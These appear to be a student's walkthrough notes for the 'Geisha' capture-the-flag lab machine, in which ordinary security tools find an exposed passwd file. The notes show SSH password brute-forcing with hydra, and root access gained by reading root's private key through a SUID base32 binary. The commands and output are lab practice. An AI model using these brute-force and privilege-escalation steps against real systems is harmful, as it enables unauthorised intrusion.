vm1
nmap -T4 -p- -A 10.224.72.142

21/tcp   open     ftp      vsftpd 3.0.3
22/tcp   open     ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1b:f2:5d:cd:89:13:f2:49:00:9f:8c:f9:eb:a2:a2:0c (RSA)
|   256 31:5a:65:2e:ab:0f:59:ab:e0:33:3a:0c:fc:49:e0:5f (ECDSA)
|_  256 c6:a7:35:14:96:13:f8:de:1e:e2:bc:e7:c7:66:8b:ac (ED25519)
80/tcp   open     http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Geisha
3389/tcp open     http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Seppuku
7080/tcp open     ssl/http LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Geisha
| ssl-cert: Subject: commonName=geisha/organizationName=webadmin/countryName=US
| Not valid before: 2020-05-09T14:01:34
|_Not valid after:  2022-05-09T14:01:34
|_ssl-date: 2022-07-26T11:51:09+00:00; -1m12s from scanner time.
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
8088/tcp open     http     LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Geisha
9198/tcp filtered unknown
MAC Address: 00:50:56:89:52:08 (VMware)

dirbuster
 --> nothing useful

nikto -h http://10.224.72.142/
Server: Apache/2.4.38 (Debian)
 --> also nothing useful

https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/pwned1

knujic@seclab:~/Desktop$ nmap -T4 -p- -A 10.224.72.142
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-26 15:27 CEST
Nmap scan report for 10.224.72.142
Host is up (0.00028s latency).
Not shown: 65527 closed ports
PORT     STATE    SERVICE  VERSION
21/tcp   open     ftp      vsftpd 3.0.3
22/tcp   open     ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1b:f2:5d:cd:89:13:f2:49:00:9f:8c:f9:eb:a2:a2:0c (RSA)
|   256 31:5a:65:2e:ab:0f:59:ab:e0:33:3a:0c:fc:49:e0:5f (ECDSA)
|_  256 c6:a7:35:14:96:13:f8:de:1e:e2:bc:e7:c7:66:8b:ac (ED25519)
80/tcp   open     http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Geisha
3389/tcp open     http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Seppuku
7080/tcp open     ssl/http LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Geisha
| ssl-cert: Subject: commonName=geisha/organizationName=webadmin/countryName=US
| Not valid before: 2020-05-09T14:01:34
|_Not valid after:  2022-05-09T14:01:34
|_ssl-date: 2022-07-26T13:26:52+00:00; -1m12s from scanner time.
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
7125/tcp open     http     nginx 1.17.10
|_http-server-header: nginx/1.17.10
|_http-title: Geisha
8088/tcp open     http     LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Geisha
9198/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1m12s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.61 seconds

knujic@seclab:~/Desktop$ nikto -h http://10.224.72.142:7125
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.224.72.142
+ Target Hostname:    10.224.72.142
+ Target Port:        7125
+ Start Time:         2022-07-26 15:29:53 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx/1.17.10
+ Retrieved x-powered-by header: PHP/7.2.10
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3092: /passwd: This could be interesting...
+ 7917 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2022-07-26 15:30:06 (GMT2) (13 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

downloaded passwd 
cat passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
geisha:x:1000:1000:geisha,,,:/home/geisha:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lsadm:x:998:1001::/:/sbin/nologin

knujic@seclab:~/Downloads$ dirb http://10.224.72.142 -p 10.224.72.142:7125

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jul 26 15:46:28 2022
URL_BASE: http://10.224.72.142/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
PROXY: 10.224.72.142:7125

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.224.72.142/ ----
+ http://10.224.72.142/index.php (CODE:200|SIZE:175)                                                                                                                                      
+ http://10.224.72.142/passwd (CODE:200|SIZE:1432)                                                                                                                                        
+ http://10.224.72.142/shadow (CODE:403|SIZE:556)                                                                                                                                         
                                                                                                                                                                                          
-----------------
END_TIME: Tue Jul 26 15:46:31 2022
DOWNLOADED: 4612 - FOUND: 3

hydra -l geisha -P /usr/share/wordlists/rockyou.txt 10.224.72.142 ssh

[22][ssh] host: 10.224.72.142   login: geisha   password: letmein
1 of 1 target successfully completed, 1 valid password found

find / -perm -u=s -type f 2>/dev/null - izbaci koje naredbe mozes koristit
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/base32
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount

geisha@geisha:~$ base32 ../../root/.ssh/id_rsa | base32 -d
got the private key of root

saved the key on my pc in the file priv.key (copy paste)
(had to change the permissions of the file so that only the root has access)

ssh -i priv.key root@10.224.72.142

root@geisha:~# cat flag.txt 
Flag{Sun_CTF_220_5_G31sha}
